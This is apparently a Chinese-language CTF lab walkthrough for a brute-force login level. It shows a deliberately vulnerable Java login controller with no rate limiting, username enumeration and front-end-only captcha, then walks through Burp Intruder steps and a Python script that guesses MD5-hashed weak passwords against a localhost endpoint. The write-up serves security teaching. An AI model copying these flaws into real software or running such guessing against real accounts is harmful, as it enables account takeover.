# Level 1 — 弱密码破解

## 关卡说明

本关模拟一个存在暴力破解漏洞的登录接口。系统没有实施频率限制、验证码保护、账户锁定等安全措施，攻击者可以使用自动化脚本配合密码字典爆破出弱密码用户的密码。

**目标**：爆破任意一个用户的密码，登录成功即可获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `BruteForceController.java`，登录接口路径：

```
POST /api/challenge/auth-session/bf/login
```

**入参**：

```json
{
  "username": "admin",
  "password": "e10adc3949ba59abbe56e057f20f883e"
}
```

> 前端将密码进行 MD5 哈希后传输，后端直接将哈希值与数据库中的 `password_md5` 字段比对。

**数据流**：

```
前端输入 username + password
    ↓
前端 JS 计算 MD5(password)
    ↓
POST /api/challenge/auth-session/bf/login  {username, password_md5}
    ↓
后端 BruteForceController.bruteForceLogin()
    ↓
userService.findByUsername(username) → 查询用户
    ↓
比对 password_md5 字段
    ↓
匹配成功 → 返回 Flag
匹配失败 → 返回 "Invalid username or password"
```

**漏洞点**：

1. **无频率限制**：`bruteForceLogin()` 方法没有任何请求频率控制，同一 IP 可以在短时间内发起无限次登录请求。

2. **用户枚举**：当用户名不存在时返回 `"The current user does not exist"`，与密码错误时的返回信息不同，攻击者可借此枚举有效用户名。

3. **验证码形同虚设**：前端使用了 4 位验证码，但验证逻辑在前端 JavaScript 中实现，可以被轻易绕过。

### 源码关键片段

```java
// BruteForceController.java — 无任何频率限制
@PostMapping("/login")
public ResponseEntity<Map<String, Object>> bruteForceLogin(@RequestBody Map<String, String> loginRequest) {
    String username = loginRequest.get("username");
    String password = loginRequest.get("password");
    
    User user = userService.findByUsername(username);
    
    if (user == null) {
        // 漏洞：用户枚举，返回了不同于密码错误的信息
        result.put("message", "The current user does not exist");
        return ResponseEntity.status(401).body(result);
    }
    
    if (!passwordMd5.equals(password)) {
        result.put("message", "Invalid username or password");
        return ResponseEntity.status(401).body(result);
    }
    
    // 登录成功直接返回 Flag
    String flag = flagService.getFlag("auth-session", "level1");
    result.put("flag", flag);  // 返回当前关卡 Flag
    return ResponseEntity.ok(result);
}
```

## 通关步骤

### Step 1：确认目标用户

访问登录页面，随意输入用户名，观察错误提示：

- 用户名不存在 → `"The current user does not exist"`
- 用户名存在但密码错误 → `"Invalid username or password"`

通过此差异可以确认哪些用户名是有效的。系统预设用户包括 `admin`、`jack`、`lucy`、`tom`。

### Step 2：使用 Burp Suite 或脚本爆破

**方式一：Burp Suite Intruder**

1. 在浏览器中正常提交一次登录请求
2. 在 Burp Proxy 中拦截该请求，右键 → Send to Intruder
3. 设置攻击参数：将 `password` 字段标记为 Payload 位置
4. 加载密码字典（如 `rockyou.txt` 或自定义弱密码字典）
5. 开始攻击，观察响应中包含 `"flag"` 字段的成功请求

**方式二：Python 脚本**

```python
import requests
import hashlib

url = "http://localhost:8080/api/challenge/auth-session/bf/login"
username = "jack"  # 目标用户

# 常见弱密码字典
passwords = ["123456", "password", "admin123", "12345678", "qwerty", "abc123"]

for pwd in passwords:
    pwd_md5 = hashlib.md5(pwd.encode()).hexdigest()
    resp = requests.post(url, json={"username": username, "password": pwd_md5})
    data = resp.json()
    
    if data.get("success"):
        print(f"[+] 爆破成功! 用户: {username}, 密码: {pwd}")
        print(f"[+] Flag: {data.get('flag')}")
        break
    else:
        print(f"[-] 尝试: {pwd} → {data.get('message')}")
```

### Step 3：获取 Flag

爆破成功后，登录接口的响应中包含 Flag：

```json
{
  "success": true,
  "message": "Login successful",
  "flag": "flag{...}"
}
```

将 Flag 提交到关卡右上角的 Flag 提交框中，即可通关。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/authsession/BruteForceController.java` | 后端登录接口，无频率限制 |
| `static/challenges/auth-session/brute-force.html` | 前端关卡页面 |
| `service/FlagService.java` | Flag 获取与验证 |
| `entity/User.java` | 用户实体（含 password_md5 字段） |
